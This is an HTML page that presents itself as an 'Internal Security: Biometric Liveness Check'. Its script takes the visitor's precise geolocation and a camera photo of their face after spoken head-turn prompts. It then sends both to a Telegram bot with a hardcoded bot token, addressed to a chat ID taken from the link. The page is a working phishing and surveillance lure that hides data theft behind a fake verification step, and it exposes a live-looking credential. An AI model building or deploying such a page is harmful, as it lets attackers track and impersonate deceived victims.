<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔒 Secure Face Verification</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #111; color: white; font-family: sans-serif; text-align: center; }
        
        #video-container { position: relative; width: 640px; height: 480px; max-width: 100%; margin-bottom: 20px; display: none; }
        #video { width: 100%; height: 100%; background: #000; border: 3px solid #00ffcc; border-radius: 12px; object-fit: cover; }
        
        .face-frame {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 240px; height: 320px;
            border: 3px dashed rgba(0, 255, 204, 0.7);
            border-radius: 50% / 40%;
            pointer-events: none;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
        }

        #status { 
            margin: 15px 20px; 
            font-weight: bold; 
            background: rgba(0,0,0,0.8); 
            padding: 20px; 
            border-radius: 10px; 
            font-size: 20px; 
            border: 1px solid #333;
            max-width: 600px;
        }
        
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 8px; border: none; background: #00ffcc; color: #111; font-weight: bold; transition: background 0.3s; }
        button:hover { background: #00b386; color: white; }
        
        .error-page { font-size: 18px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.9); border-radius: 15px; border: 1px solid #444; max-width: 500px; margin: auto; }
    </style>
</head>
<body>
    <div id="app">
        <h2>🛡️ Internal Security: Biometric Liveness Check</h2>
        <div id="status">Click start to begin identity verification</div>
        
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="face-frame"></div>
        </div>
        
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="startBtn">START VERIFICATION 🔐</button>
    </div>

    <script>
        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
        const app = document.getElementById('app');
        const video = document.getElementById('video');
        const videoContainer = document.getElementById('video-container');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        function showError(msg) {
            app.innerHTML = `<div class="error-page">
                <p>⚠️ ${msg || "Verification failed or permissions denied."}</p>
                <p style="font-size: 14px; color: #aaa; margin-top: 10px;">Please ensure you are using HTTPS and have allowed camera/location permissions in your browser settings.</p>
                <button onclick="location.reload()" style="margin-top:15px; font-size:16px; padding:10px 20px;">Retry</button>
            </div>`;
        }

        function speakPrompt(text, callback) {
            status.innerText = text;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.rate = 1.0;
                utterance.pitch = 1.0;
                utterance.onend = () => { if (callback) callback(); };
                window.speechSynthesis.speak(utterance);
            } else {
                setTimeout(callback, 2500);
            }
        }

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { 
                status.innerText = "❌ Missing Verification ID in URL (?id=...)"; 
                return; 
            }
            startBtn.style.display = 'none';

            // 1. 优化定位：增加容错，避免因定位失败直接中断整个流程
            let locationText = "Location not available";
            try {
                status.innerText = "Verifying device location node 📍";
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
                });
                locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
            } catch (err) {
                console.warn("Geolocation warning:", err);
                locationText = "Location permission denied or timeout";
                // 此处选择继续执行，不直接阻断摄像头拍照
            }

            // 2. 初始化摄像头
            try {
                status.innerText = "Initializing camera sensor...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                video.srcObject = stream;
                videoContainer.style.display = 'block';

                speakPrompt("Please position your face inside the frame.", () => {
                    setTimeout(() => {
                        speakPrompt("Please turn your head slowly to the left, then to the right.", () => {
                            setTimeout(() => {
                                speakPrompt("Now, nod your head up and down.", () => {
                                    setTimeout(() => {
                                        speakPrompt("Verification sample capturing. Please hold still.", () => {
                                            setTimeout(() => {
                                                captureAndUpload(stream, locationText);
                                            }, 1000);
                                        });
                                    }, 3000);
                                });
                            }, 4000);
                        });
                    }, 3000);
                });

            } catch (err) {
                console.warn("Camera error:", err);
                showError("Camera permission denied or hardware not supported.");
            }
        });

        async function captureAndUpload(stream, locationText) {
            status.innerText = "Processing biometric signature...";
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.innerText = "⚠️ Failed to capture image frame.";
                    return;
                }
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'liveness_check.jpg');
                formData.append('caption', `🛡️ [Biometric Verification Log]\nID: ${CHAT_ID}\n📍 ${locationText}\nStatus: Liveness checks completed.`);

                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    const data = await res.json();
                    
                    if (data.ok) {
                        status.style.color = "#00ffcc";
                        status.innerText = "✅ Liveness Verification Successful!";
                        stream.getTracks().forEach(t => t.stop());
                        videoContainer.style.display = 'none';
                    } else {
                        status.innerText = "⚠️ Transmission Error: " + (data.description || "Unknown");
                    }
                } catch (e) {
                    status.innerText = "⚠️ Network Error during upload.";
                }
            }, 'image/jpeg', 0.95);
        }
    </script>
</body>
</html>
